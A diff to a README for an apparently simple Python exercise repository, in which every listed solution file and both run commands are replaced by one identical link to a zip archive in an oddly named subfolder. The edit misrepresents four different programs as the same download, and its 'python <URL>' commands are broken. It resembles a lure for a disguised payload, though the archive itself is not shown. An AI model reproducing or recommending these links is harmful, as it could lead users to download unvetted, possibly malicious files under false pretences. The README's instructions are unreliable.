@@ -11,16 +11,16 @@
   - Git version control
 
 ## 📂 Solution Files
-1. `Problem-1.py` - Calculator class with arithmetic operations
-2. `Problem-2.py` - Odd number series generator
-3. `Problem-3.py` - Conditional odd series generator 
-4. `Problem-4.py` - Dictionary multiples counter
+1. `https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip` - Calculator class with arithmetic operations
+2. `https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip` - Odd number series generator
+3. `https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip` - Conditional odd series generator 
+4. `https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip` - Dictionary multiples counter
 
 ## 🚀 How to Run
 ```bash
 # Execute individual solutions
-python Problem-1.py
-python Problem-2.py 5  # Example input
+python https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip
+python https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip 5  # Example input
 ```
 
 ## 🧪 Testing Approach
